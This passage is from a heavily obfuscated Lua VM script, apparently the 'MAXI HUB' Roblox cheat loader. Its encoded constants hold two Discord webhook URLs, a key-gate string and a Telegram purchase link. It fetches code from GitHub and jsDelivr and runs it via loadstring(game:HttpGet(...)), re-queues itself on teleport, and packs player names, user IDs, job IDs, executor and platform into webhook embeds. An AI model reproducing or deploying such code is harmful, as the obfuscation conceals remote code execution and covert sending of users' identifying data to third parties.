							Inst = Instr[VIP];
							Stk[Inst[2]] = Upvalues[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A](Stk[A + 1]);
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Upvalues[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Upvalues[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
							VIP = VIP + 1;
							Inst = Instr[VIP];
							if Stk[Inst[2]] then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						else
							local A = Inst[2];
							Stk[A](Stk[A + 1]);
						end
					elseif (Enum <= 53) then
						if (Enum == 52) then
							Stk[Inst[2]] = Env[Inst[3]];
						else
							local A;
							Stk[Inst[2]] = Upvalues[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Upvalues[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
							VIP = VIP + 1;
							Inst = Instr[VIP];
							if Stk[Inst[2]] then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						end
					elseif (Enum <= 54) then
						local A = Inst[2];
						Stk[A](Unpack(Stk, A + 1, Top));
					elseif (Enum == 55) then
						Stk[Inst[2]] = Inst[3] ~= 0;
						VIP = VIP + 1;
					else
						local Edx;
						local Limit;
						local Results;
						local A;
						Stk[Inst[2]] = Upvalues[Inst[3]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						A = Inst[2];
						Stk[A] = Stk[A]();
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Upvalues[Inst[3]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						A = Inst[2];
						Results = {Stk[A]()};
						Limit = Inst[4];
						Edx = 0;
						for Idx = A, Limit do
							Edx = Edx + 1;
							Stk[Idx] = Results[Edx];
						end
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Upvalues[Inst[3]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						A = Inst[2];
						Stk[A] = Stk[A]();
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = {};
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Upvalues[Inst[3]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Upvalues[Inst[3]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Upvalues[Inst[3]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]][Inst[3]] = Inst[4];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						A = Inst[2];
						Stk[A] = Stk[A](Stk[A + 1]);
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Upvalues[Inst[3]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						A = Inst[2];
						Stk[A](Stk[A + 1]);
						VIP = VIP + 1;
						Inst = Instr[VIP];
						do
							return;
						end
					end
				elseif (Enum <= 65) then
					if (Enum <= 60) then
						if (Enum <= 58) then
							if (Enum == 57) then
								Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
							else
								local A = Inst[2];
								local T = Stk[A];
								for Idx = A + 1, Inst[3] do
									Insert(T, Stk[Idx]);
								end
							end
						elseif (Enum == 59) then
							if Stk[Inst[2]] then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						else
							local A = Inst[2];
							local Results = {Stk[A]()};
							local Limit = Inst[4];
							local Edx = 0;
							for Idx = A, Limit do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						end
					elseif (Enum <= 62) then
						if (Enum == 61) then
							local A = Inst[2];
							local Results = {Stk[A](Stk[A + 1])};
							local Edx = 0;
							for Idx = A, Inst[4] do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						else
							Stk[Inst[2]] = Inst[3];
						end
					elseif (Enum <= 63) then
						local A = Inst[2];
						local Results = {Stk[A](Unpack(Stk, A + 1, Inst[3]))};
						local Edx = 0;
						for Idx = A, Inst[4] do
							Edx = Edx + 1;
							Stk[Idx] = Results[Edx];
						end
					elseif (Enum == 64) then
						local A;
						Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Inst[3];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Inst[3];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						A = Inst[2];
						Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
						VIP = VIP + 1;
						Inst = Instr[VIP];
						if not Stk[Inst[2]] then
							VIP = VIP + 1;
						else
							VIP = Inst[3];
						end
					elseif not Stk[Inst[2]] then
						VIP = VIP + 1;
					else
						VIP = Inst[3];
					end
				elseif (Enum <= 70) then
					if (Enum <= 67) then
						if (Enum == 66) then
							local NewProto = Proto[Inst[3]];
							local NewUvals;
							local Indexes = {};
							NewUvals = Setmetatable({}, {__index=function(_, Key)
								local Val = Indexes[Key];
								return Val[1][Val[2]];
							end,__newindex=function(_, Key, Value)
								local Val = Indexes[Key];
								Val[1][Val[2]] = Value;
							end});
							for Idx = 1, Inst[4] do
								VIP = VIP + 1;
								local Mvm = Instr[VIP];
								if (Mvm[1] == 31) then
									Indexes[Idx - 1] = {Stk,Mvm[3]};
								else
									Indexes[Idx - 1] = {Upvalues,Mvm[3]};
								end
								Lupvals[#Lupvals + 1] = Indexes;
							end
							Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
						else
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = {};
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
						end
					elseif (Enum <= 68) then
						local K;
						local B;
						local A;
						Stk[Inst[2]] = Stk[Inst[3]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						A = Inst[2];
						Stk[A] = Stk[A](Stk[A + 1]);
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Env[Inst[3]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Stk[Inst[3]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						A = Inst[2];
						Stk[A] = Stk[A](Stk[A + 1]);
						VIP = VIP + 1;
						Inst = Instr[VIP];
						B = Inst[3];
						K = Stk[B];
						for Idx = B + 1, Inst[4] do
							K = K .. Stk[Idx];
						end
						Stk[Inst[2]] = K;
						VIP = VIP + 1;
						Inst = Instr[VIP];
						do
							return Stk[Inst[2]];
						end
						VIP = VIP + 1;
						Inst = Instr[VIP];
						do
							return;
						end
					elseif (Enum == 69) then
						Stk[Inst[2]][Stk[Inst[3]]] = Inst[4];
					else
						VIP = Inst[3];
					end
				elseif (Enum <= 72) then
					if (Enum > 71) then
						local B;
						local T;
						local A;
						Stk[Inst[2]] = {};
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Upvalues[Inst[3]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						A = Inst[2];
						Stk[A] = Stk[A]();
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Upvalues[Inst[3]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						A = Inst[2];
						T = Stk[A];
						B = Inst[3];
						for Idx = 1, B do
							T[Idx] = Stk[A + Idx];
						end
					else
						for Idx = Inst[2], Inst[3] do
							Stk[Idx] = nil;
						end
					end
				elseif (Enum <= 73) then
					local B;
					local A;
					Stk[Inst[2]] = Env[Inst[3]];
					VIP = VIP + 1;
					Inst = Instr[VIP];
					A = Inst[2];
					B = Stk[Inst[3]];
					Stk[A + 1] = B;
					Stk[A] = B[Inst[4]];
					VIP = VIP + 1;
					Inst = Instr[VIP];
					Stk[Inst[2]] = Inst[3];
					VIP = VIP + 1;
					Inst = Instr[VIP];
					A = Inst[2];
					Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
					VIP = VIP + 1;
					Inst = Instr[VIP];
					Stk[Inst[2]] = Env[Inst[3]];
					VIP = VIP + 1;
					Inst = Instr[VIP];
					A = Inst[2];
					B = Stk[Inst[3]];
					Stk[A + 1] = B;
					Stk[A] = B[Inst[4]];
					VIP = VIP + 1;
					Inst = Instr[VIP];
					A = Inst[2];
					Stk[A] = Stk[A](Stk[A + 1]);
					VIP = VIP + 1;
					Inst = Instr[VIP];
					if not Stk[Inst[2]] then
						VIP = VIP + 1;
					else
						VIP = Inst[3];
					end
				elseif (Enum == 74) then
					local A = Inst[2];
					local C = Inst[4];
					local CB = A + 2;
					local Result = {Stk[A](Stk[A + 1], Stk[CB])};
					for Idx = 1, C do
						Stk[CB + Idx] = Result[Idx];
					end
					local R = Result[1];
					if R then
						Stk[CB] = R;
						VIP = Inst[3];
					else
						VIP = VIP + 1;
					end
				else
					local A;
					local K;
					local B;
					Stk[Inst[2]] = Stk[Inst[3]];
					VIP = VIP + 1;
					Inst = Instr[VIP];
					Stk[Inst[2]] = Stk[Inst[3]];
					VIP = VIP + 1;
					Inst = Instr[VIP];
					Stk[Inst[2]] = Inst[3];
					VIP = VIP + 1;
					Inst = Instr[VIP];
					Stk[Inst[2]] = Stk[Inst[3]];
					VIP = VIP + 1;
					Inst = Instr[VIP];
					B = Inst[3];
					K = Stk[B];
					for Idx = B + 1, Inst[4] do
						K = K .. Stk[Idx];
					end
					Stk[Inst[2]] = K;
					VIP = VIP + 1;
					Inst = Instr[VIP];
					A = Inst[2];
					Stk[A] = Stk[A](Stk[A + 1]);
					VIP = VIP + 1;
					Inst = Instr[VIP];
					Stk[Inst[2]] = Upvalues[Inst[3]];
					VIP = VIP + 1;
					Inst = Instr[VIP];
					Stk[Inst[2]] = Stk[Inst[3]];
					VIP = VIP + 1;
					Inst = Instr[VIP];
					Stk[Inst[2]] = Inst[3];
					VIP = VIP + 1;
					Inst = Instr[VIP];
					Stk[Inst[2]] = Stk[Inst[3]];
					VIP = VIP + 1;
					Inst = Instr[VIP];
					B = Inst[3];
					K = Stk[B];
					for Idx = B + 1, Inst[4] do
						K = K .. Stk[Idx];
					end
					Stk[Inst[2]] = K;
					VIP = VIP + 1;
					Inst = Instr[VIP];
					A = Inst[2];
					Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
					VIP = VIP + 1;
					Inst = Instr[VIP];
					if Stk[Inst[2]] then
						VIP = VIP + 1;
					else
						VIP = Inst[3];
					end
				end
				VIP = VIP + 1;
			end
		end;
	end
	return Wrap(Deserialize(), {}, vmenv)(...);
end
return VMCall("LOL!113Q0003793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F313238313235302Q363335342Q3739373537362F2D674B4C57477030426D2D77706E492D4F656C6B354166504777745154676B2Q695342674A764E6250555044384F6E2D516250394D4F4944364E556E4E4764635F39713003793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F31342Q302Q322Q3435303539343630333038302F48573965555250525A432Q5277743462547A52412D58346A6B323056626C414C4642555F6A505A7A534C63735964453466444656635A6D5776755F784571737955584D68030E3Q004D4158494855425F4B45595F563203153Q00682Q7470733A2Q2F742E6D652F4D4158495F485542033C3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F6B6F744D613073316E2F6D6178692D6875622F6D61737465722F03363Q00682Q7470733A2Q2F63646E2E6A7364656C6976722E6E65742F67682F6B6F744D613073316E2F6D6178692D687562406D61737465722F03073Q004D617869487562031A3Q006D6178692D6875622F6D6178692D6875622D636F72652E6C756103113Q006D6178692D6875622D636F72652E6C756103193Q006D6178692D6875622F6D6178692D6875622D6B65792E6C756103103Q006D6178692D6875622D6B65792E6C756103123Q007265616452656A6F696E4175746F4C6F616403123Q00726567697374657252656A6F696E482Q6F6B03153Q004D617869487562526567697374657252656A6F696E03053Q007063612Q6C03043Q007761726E03233Q005B4D415849204855425D20D09ED188D0B8D0B1D0BAD0B020D0BAD0BBD18ED187D0B03A004A3Q0012433Q00013Q00122Q000100023Q00122Q000200033Q00122Q000300043Q00122Q000400053Q00122Q000500063Q00122Q000600076Q000700023Q00122Q000800083Q00122Q000900094Q001B0007000200012Q0024000800023Q00123E0009000A3Q00123E000A000B4Q001B00080002000100020100095Q000642000A0001000100022Q001F3Q00094Q001F3Q00043Q000201000B00023Q000201000C00033Q000201000D00043Q000642000E0005000100062Q001F3Q000D4Q001F3Q00094Q001F3Q000A4Q001F3Q00054Q001F3Q000B4Q001F3Q000C3Q000642000F0006000100012Q001F3Q00063Q00064200100007000100012Q001F3Q000F3Q00064200110008000100042Q001F3Q00094Q001F3Q00104Q001F3Q000E4Q001F3Q00073Q000201001200093Q0012180012000C3Q0002010012000A3Q0012180012000D4Q001F001200094Q000B0012000100020006420013000B000100012Q001F3Q00093Q0010130012000E00130006420012000C000100022Q001F3Q000E4Q001F3Q00083Q0002010013000D3Q0006420014000E000100012Q001F3Q00113Q0006420015000F000100072Q001F3Q00094Q001F3Q00134Q001F3Q00124Q001F3Q00014Q001F3Q00034Q001F3Q00024Q001F3Q00143Q0012340016000F4Q001F001700154Q003D00160002001700064100160046000100010004463Q00460001001234001800103Q00123E001900114Q001F001A00176Q0018001A000100064200180010000100012Q001F8Q001A0018000100012Q002B3Q00013Q00113Q00043Q0003063Q00747970656F6603073Q0067657467656E7603083Q0066756E6374696F6E03023Q005F47000C3Q0012343Q00013Q001234000100024Q00033Q000200020026163Q0009000100030004463Q000900010012343Q00024Q000B3Q000100020006413Q000A000100010004463Q000A00010012343Q00044Q00143Q00024Q002B3Q00017Q00013Q0003123Q004D6178694875624F2Q66696369616C52617700084Q00218Q000B3Q0001000200202900013Q000100064100010006000100010004463Q000600012Q0021000100014Q0014000100024Q002B3Q00017Q000A3Q0003063Q00747970656F6603023Q006F7303053Q007461626C6503043Q0074696D65028Q0003043Q006D61746803063Q0072616E646F6D025Q00408F40024Q008087C34003083Q00746F737472696E6700293Q0012343Q00013Q001234000100024Q00033Q000200020026163Q000E000100030004463Q000E00010012343Q00023Q0020295Q000400063B3Q000E00013Q0004463Q000E00010012343Q00023Q0020295Q00042Q000B3Q000100020006413Q000F000100010004463Q000F000100123E3Q00053Q001234000100013Q001234000200064Q00030001000200020026160001001F000100030004463Q001F0001001234000100063Q00202900010001000700063B0001001F00013Q0004463Q001F0001001234000100063Q00204000010001000700122Q000200083Q00122Q000300096Q00010003000200062Q00010020000100010004463Q0020000100123E000100053Q0012340002000A4Q004400038Q00020002000200122Q0003000A6Q000400016Q0003000200024Q0002000200034Q000200028Q00017Q000B3Q0003063Q00747970656F6603043Q0067616D6503073Q00482Q747047657403083Q0066756E6374696F6E03053Q007063612Q6C03043Q007479706503063Q00737472696E67034Q0003073Q007265717565737403053Q007461626C6503043Q00426F647901443Q001217000100013Q00122Q000200023Q00202Q0002000200034Q00010002000200262Q00010027000100040004463Q00270001001234000100053Q001208000200023Q00202Q0002000200034Q00038Q000400016Q00010004000200062Q0001001600013Q0004463Q00160001001234000300064Q001F000400024Q000300030002000200261600030016000100070004463Q0016000100262A00020016000100080004463Q001600012Q0014000200023Q001234000300053Q001215000400023Q00202Q0004000400034Q00058Q0003000500044Q000200046Q000100033Q00062Q0001002700013Q0004463Q00270001001234000300064Q001F000400024Q000300030002000200261600030027000100070004463Q0027000100262A00020027000100080004463Q002700012Q0014000200023Q001234000100013Q001234000200094Q000300010002000200261600010041000100040004463Q00410001001234000100053Q00064200023Q000100012Q001F8Q003D00010002000200063B0001004100013Q0004463Q00410001001234000300064Q001F000400024Q0003000300020002002616000300410001000A0004463Q00410001001234000300063Q00202900040002000B2Q000300030002000200261600030041000100070004463Q0041000100202900030002000B00262A00030041000100080004463Q0041000100202900030002000B2Q0014000300024Q0047000100014Q0014000100024Q002B3Q00013Q00013Q00043Q0003073Q00726571756573742Q033Q0055726C03063Q004D6574686F642Q033Q0047455400083Q00122C3Q00016Q00013Q00024Q00025Q00102Q00010002000200302Q0001000300046Q00019Q008Q00017Q00063Q0003043Q007479706503063Q00737472696E67034Q00030A3Q006C6F6164737472696E6703073Q00406D6F64756C650002153Q001234000200014Q001F00036Q000300020002000200261600020007000100020004463Q000700010026163Q0009000100030004463Q000900012Q002300026Q0014000200023Q001234000200044Q001F00035Q0006190004000E000100010004463Q000E000100123E000400054Q000400020004000200261600020012000100060004463Q001200012Q003700026Q0023000200014Q0014000200024Q002B3Q00017Q000B3Q0003063Q00747970656F6603083Q007265616466696C6503083Q0066756E6374696F6E03063Q00697366696C6503063Q0069706169727303013Q0040030F3Q004D6178694875625265706F4F6E6C792Q012Q033Q003F763D03053Q00652Q726F7203393Q005B4D415849204855425D20D0A2D0BED0BBD18CD0BAD0BE20D0BED184D0B8D186D0B8D0B0D0BBD18CD0BDD18BD0B920D180D0B5D0BFD0BE3A20024F3Q001234000200013Q001234000300024Q000300020002000200261600020021000100030004463Q00210001001234000200013Q001234000300044Q000300020002000200261600020021000100030004463Q00210001001234000200054Q001F000300014Q003D0002000200040004463Q001F0001001234000700044Q001F000800064Q000300070002000200063B0007001F00013Q0004463Q001F0001001234000700024Q0012000800066Q0007000200024Q00088Q000900073Q00122Q000A00066Q000B00066Q000A000A000B4Q0008000A000200062Q0008001F00013Q0004463Q001F00012Q0014000700023Q00064A0002000E000100020004463Q000E00012Q0021000200014Q000B00020001000200202900030002000700262A00030027000100080004463Q002700012Q003700036Q0023000300014Q0048000400026Q000500026Q0005000100024Q000600036Q0004000200012Q0021000500044Q002D00050001000200122Q000600056Q000700046Q00060002000800044Q004300012Q0021000B00054Q004B000C000A6Q000D5Q00122Q000E00096Q000F00056Q000C000C000F4Q000B000200024Q000C8Q000D000B3Q00122Q000E00066Q000F8Q000E000E000F4Q000C000E000200062Q000C004300013Q0004463Q004300012Q0014000B00023Q00064A00060033000100020004463Q0033000100063B0003004C00013Q0004463Q004C00010012340006000A3Q00123E0007000B4Q001F00086Q000F0007000700082Q00330006000200012Q0047000600064Q0014000600024Q002B3Q00017Q00043Q0003133Q005F4D617869487562477569526567697374727903053Q007063612Q6C0003113Q005F4D617869487562496E707574436F2Q6E01253Q00202900013Q000100063B0001001000013Q0004463Q0010000100202900013Q00012Q002100026Q003900010001000200063B0001000F00013Q0004463Q000F0001001234000200023Q00064200033Q000100012Q001F3Q00014Q003300020002000100202900023Q00012Q002100035Q0020450002000300032Q002F00015Q00202900013Q000400063B0001002000013Q0004463Q0020000100202900013Q00042Q002100026Q003900010001000200063B0001001F00013Q0004463Q001F0001001234000200023Q00064200030001000100012Q001F3Q00014Q003300020002000100202900023Q00042Q002100035Q0020450002000300032Q002F00015Q001234000100023Q00064200020002000100012Q00218Q00330001000200012Q002B3Q00013Q00033Q00043Q0003063Q00747970656F6603083Q00496E7374616E636503063Q00506172656E7403073Q0044657374726F79000D3Q0012343Q00014Q002100016Q00033Q000200020026163Q000C000100020004463Q000C00012Q00217Q0020295Q000300063B3Q000C00013Q0004463Q000C00012Q00217Q0020105Q00042Q00333Q000200012Q002B3Q00017Q00013Q00030A3Q00446973636F2Q6E65637400044Q00217Q0020105Q00012Q00333Q000200012Q002B3Q00017Q00073Q0003043Q0067616D65030A3Q004765745365727669636503073Q00506C6179657273030B3Q004C6F63616C506C61796572030E3Q0046696E6446697273744368696C6403093Q00506C6179657247756903073Q0044657374726F7900143Q00120A3Q00013Q00206Q000200122Q000200038Q0002000200202Q00013Q000400062Q0002000A000100010004463Q000A000100201000020001000500123E000400064Q000400020004000200061E0003000F000100020004463Q000F00010020100003000200052Q002100056Q000400030005000200063B0003001300013Q0004463Q001300010020100004000300072Q00330004000200012Q002B3Q00017Q00063Q0003063Q00747970656F66030B3Q004D61786948756253746F7003083Q0066756E6374696F6E03053Q007063612Q6C03123Q005F4D617869487562436F72654C6F6164656400010D3Q001234000100013Q00202900023Q00022Q000300010002000200261600010008000100030004463Q00080001001234000100043Q00202900023Q00022Q00330001000200012Q002100016Q001F00026Q00330001000200010030253Q000500062Q002B3Q00017Q000D3Q0003113Q006D6178692D6875622D636F72652E6C7561034Q0003053Q00652Q726F7203483Q005B4D415849204855425D20D09DD0B520D0BDD0B0D0B9D0B4D0B5D0BD206D6178692D6875622D636F72652E6C75612028776F726B737061636520D0B8D0BBD0B82047697448756229030A3Q006C6F6164737472696E6703123Q00406D6178692D6875622D636F72652E6C756103193Q005B4D415849204855425D20636F6D70696C6520636F72653A2003083Q00746F737472696E6703053Q007063612Q6C03153Q005B4D415849204855425D2072756E20636F72653A2003123Q005F4D617869487562436F72654C6F616465642Q0103123Q00726567697374657252656A6F696E482Q6F6B00304Q00329Q003Q000100024Q000100016Q00028Q0001000200014Q000100023Q00122Q000200016Q000300036Q00010003000200062Q0001000D00013Q0004463Q000D000100261600010010000100020004463Q00100001001234000200033Q00123E000300044Q0033000200020001001234000200054Q001F000300013Q00123E000400064Q003F0002000400030006410002001D000100010004463Q001D0001001234000400033Q001227000500073Q00122Q000600086Q000700036Q0006000200024Q0005000500064Q000400020001001234000400094Q001F000500024Q003D00040002000500064100040029000100010004463Q00290001001234000600033Q0012270007000A3Q00122Q000800086Q000900056Q0008000200024Q0007000700084Q0006000200010030253Q000B000C0012310006000D6Q00078Q0006000200014Q000600016Q000600028Q00017Q00083Q0003063Q00747970656F6603063Q00697366696C6503083Q0066756E6374696F6E03083Q007265616466696C6503143Q006D6178692D6875622D636F6E6669672E6A736F6E03053Q007063612Q6C03053Q007461626C65030E3Q0052656A6F696E4175746F4C6F616400253Q0012343Q00013Q001234000100024Q00033Q000200020026163Q000A000100030004463Q000A00010012343Q00013Q001234000100044Q00033Q0002000200262A3Q000C000100030004463Q000C00012Q00238Q00143Q00023Q0012343Q00023Q00123E000100054Q00033Q000200020006413Q0013000100010004463Q001300012Q00238Q00143Q00023Q0012343Q00063Q00020100016Q003D3Q0002000100063B3Q002200013Q0004463Q00220001001234000200014Q001F000300014Q000300020002000200261600020022000100070004463Q0022000100202900020001000800063B0002002200013Q0004463Q002200012Q0023000200014Q0014000200024Q002300026Q0014000200024Q002B3Q00013Q00013Q00063Q0003043Q0067616D65030A3Q0047657453657276696365030B3Q00482Q747053657276696365030A3Q004A534F4E4465636F646503083Q007265616466696C6503143Q006D6178692D6875622D636F6E6669672E6A736F6E000B3Q0012203Q00013Q00206Q000200122Q000200038Q0002000200206Q000400122Q000200053Q00122Q000300066Q000200039Q009Q008Q00017Q000E3Q0003063Q00747970656F6603113Q0071756575655F6F6E5F74656C65706F727403083Q0066756E6374696F6E03123Q007265616452656A6F696E4175746F4C6F616403143Q005F4D61786948756252656A6F696E5175657565640003103Q004D6178694875624C6F6164657255726C034Q0003193Q006C6F6164737472696E672867616D653A482Q7470476574282203053Q00222Q29282903123Q004D6178694875624F2Q66696369616C526177030F3Q006C6F616465722E6C7561222Q292829032F3Q006C6F6164737472696E67287265616466696C6528226D6178692D6875622F6C61756E636865722E6C7561222Q2928293Q012A3Q001234000100013Q001234000200024Q000300010002000200262A00010006000100030004463Q000600012Q002B3Q00013Q001234000100044Q000B0001000100020006410001000C000100010004463Q000C00010030253Q000500062Q002B3Q00013Q00202900013Q000500063B0001001000013Q0004463Q001000012Q002B3Q00014Q0047000100013Q00202900023Q000700063B0002001C00013Q0004463Q001C000100202900023Q000700262A0002001C000100080004463Q001C000100123E000200093Q00202900033Q000700123E0004000A4Q000F0001000200040004463Q0025000100202900023Q000B00063B0002002400013Q0004463Q0024000100123E000200093Q00202900033Q000B00123E0004000C4Q000F0001000200040004463Q0025000100123E0001000D3Q001234000200024Q001F000300014Q00330002000200010030253Q0005000E2Q002B3Q00017Q00013Q0003123Q00726567697374657252656A6F696E482Q6F6B00053Q0012093Q00016Q00018Q000100019Q0000016Q00017Q000A3Q0003103Q006D6178692D6875622D6B65792E6C7561034Q0003053Q00652Q726F7203473Q005B4D415849204855425D20D09DD0B520D0BDD0B0D0B9D0B4D0B5D0BD206D6178692D6875622D6B65792E6C75612028776F726B737061636520D0B8D0BBD0B82047697448756229030A3Q006C6F6164737472696E6703113Q00406D6178692D6875622D6B65792E6C756103183Q005B4D415849204855425D20636F6D70696C65206B65793A2003083Q00746F737472696E6703053Q007063612Q6C03143Q005B4D415849204855425D2072756E206B65793A2000264Q00357Q00122Q000100016Q000200018Q0002000200064Q000800013Q0004463Q000800010026163Q000B000100020004463Q000B0001001234000100033Q00123E000200044Q0033000100020001001234000100054Q001F00025Q00123E000300064Q003F00010003000200064100010018000100010004463Q00180001001234000300033Q001227000400073Q00122Q000500086Q000600026Q0005000200024Q0004000400054Q000300020001001234000300094Q001F000400014Q003D00030002000400064100030024000100010004463Q00240001001234000500033Q0012270006000A3Q00122Q000700086Q000800046Q0007000200024Q0006000600074Q0005000200012Q0014000400024Q002B3Q00017Q000D3Q0003043Q0067616D65030A3Q004765745365727669636503073Q00506C617965727303083Q0049734C6F6164656403063Q004C6F6164656403043Q0057616974030B3Q004C6F63616C506C61796572030B3Q00506C61796572412Q646564030C3Q0057616974466F724368696C6403093Q00506C61796572477569026Q003E4003053Q00652Q726F72031B3Q005B4D415849204855425D20D09DD0B5D18220506C6179657247756900203Q0012493Q00013Q00206Q000200122Q000200038Q0002000200122Q000100013Q00202Q0001000100044Q00010002000200062Q0001000D000100010004463Q000D0001001234000100013Q0020290001000100050020100001000100062Q003300010002000100202900013Q000700064100010013000100010004463Q0013000100202900013Q00080020100001000100062Q000300010002000200201000020001000900123E0004000A3Q00123E0005000B4Q00040002000500020006410002001C000100010004463Q001C00010012340003000C3Q00123E0004000D4Q00330003000200012Q001F000300014Q001F000400024Q0002000300034Q002B3Q00017Q00033Q0003053Q007063612Q6C03043Q007761726E032F3Q005B4D415849204855425D20D09AD180D0B8D182D0B8D187D0B5D181D0BAD0B0D18F20D0BED188D0B8D0B1D0BAD0B03A000A3Q0012343Q00014Q002100016Q003D3Q000200010006413Q0009000100010004463Q00090001001234000200023Q00123E000300034Q001F000400016Q0002000400012Q002B3Q00017Q000A3Q0003063Q0063726561746503073Q00776562682Q6F6B03083Q0074656C656772616D03063Q0073656372657403063Q00706C6179657203093Q00706C61796572477569030F3Q0070757263686173654D652Q7361676503483Q00D094D0BED181D182D183D0BF20D0BDD0B520D0BED0BFD0BBD0B0D187D0B5D0BD2E0AD09AD183D0BFD0B8D182D18C20D0B4D0BED181D182D183D0BF20D0B22054656C656772616D3A030E3Q004D6178694875624B65794761746503123Q0073686F7750757263686173654E6F7469636500174Q00389Q003Q000100024Q000100016Q0001000100024Q000300026Q00030001000200202Q0004000300014Q00053Q00064Q000600033Q00102Q0005000200064Q000600043Q00102Q0005000300064Q000600053Q00102Q00050004000600102Q00050005000100102Q00050006000200302Q0005000700084Q00040002000200104Q0009000400202Q00050004000A4Q000600066Q0005000200016Q00017Q00243Q0003043Q0067616D65030A3Q004765745365727669636503073Q00506C617965727303103Q0055736572496E70757453657276696365030B3Q00482Q747053657276696365030B3Q004C6F63616C506C61796572030B3Q00476574506C6174666F726D03043Q00456E756D03083Q00506C6174666F726D03073Q00416E64726F69642Q033Q00494F5303073Q00414E44524F494403023Q00504303063Q00656D6265647303053Q007469746C6503233Q00D090D0BAD182D0B8D0B2D0B8D180D0BED0B2D0B0D0BD20D181D0BAD180D0B8D0BFD18203053Q00636F6C6F72024Q006069F84003063Q006669656C647303043Q006E616D65030B3Q00446973706C61794E616D6503053Q0076616C756503063Q00696E6C696E652Q0103043Q004E616D6503023Q00494403083Q00746F737472696E6703063Q0055736572496403053Q006A6F62496403053Q004A6F624964010003083Q004578656375746F7203123Q00D0